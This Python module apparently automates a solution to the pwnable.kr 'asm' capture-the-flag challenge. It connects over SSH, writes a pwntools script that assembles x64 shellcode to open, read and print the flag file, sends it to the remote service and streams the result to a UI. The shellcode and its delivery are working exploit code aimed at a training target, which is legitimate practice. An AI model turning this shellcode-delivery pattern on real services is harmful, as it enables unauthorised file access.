from pwn import *
import json
import os

def exploit_asm(challenge_config):
    """asm exploit implementation - assemble on SSH host, send to asm service (9026)"""
    def log(msg):
        yield f"data: {json.dumps({'type': 'log', 'message': msg})}\n\n"

    try:
        yield from log("Connecting to pwnable.kr...")

        context.log_level = 'error'

        s = ssh(
            host=challenge_config['ssh_host'],
            port=challenge_config['ssh_port'],
            user=challenge_config['ssh_user'],
            password=challenge_config['ssh_pass'],
        )
        yield from log("✓ Connected successfully")

        yield from log("Crafting shellcode on server...")

        exploit_script = r'''#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'error'

filename = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'

shellcode = shellcraft.open(filename, 0, 0)
shellcode += shellcraft.read('rax', 'rsp', 50)
shellcode += shellcraft.write(1, 'rsp', 50)
shellcode += shellcraft.exit(0)

sc = asm(shellcode)

# print payload (hex) for UI/debugging
print("PAYLOAD_HEX=" + repr(sc))

p = remote('pwnable.kr', 9026)
p.recvuntil(b'give me your x64 shellcode: ')
p.sendline(sc)

out = p.recvall(timeout=5).decode(errors='ignore')
out = out.replace('\x00', '').strip()

# print only the flag token
flag = out.split()[0] if out else ''
print(flag)
'''

        tmpdir = '/tmp/yael_asm_' + str(os.getpid())
        s.run(f'mkdir -p {tmpdir}')

        exploit_file = tmpdir + '/exploit.py'
        with s.sftp.open(exploit_file, 'w') as f:
            f.write(exploit_script)

        s.run(f'chmod +x {exploit_file}')

        yield from log("✓ Shellcode script created")
        yield from log("Executing shellcode exploit...")

        ch = s.run(f'python3 {exploit_file}')
        output = ch.recvall(timeout=8).decode(errors='ignore').strip()

        payload_hex = None
        flag = None

        for line in output.splitlines():
            if line.startswith("PAYLOAD_HEX="):
                payload_hex = line.split("=", 1)[1]
            elif line:
                flag = line

        if payload_hex:
            yield f"data: {json.dumps({'type': 'payload', 'payload': payload_hex})}\n\n"

        if flag:
            yield from log("✓ Flag captured!")
            yield f"data: {json.dumps({'type': 'flag', 'flag': flag})}\n\n"
        else:
            yield from log("⚠ No flag output received")

        s.close()

        yield from log("✓ Exploit complete")
        yield f"data: {json.dumps({'type': 'done'})}\n\n"

    except Exception as e:
        yield from log(f"✗ Error: {str(e)}")
        yield f"data: {json.dumps({'type': 'error', 'message': str(e)})}\n\n"
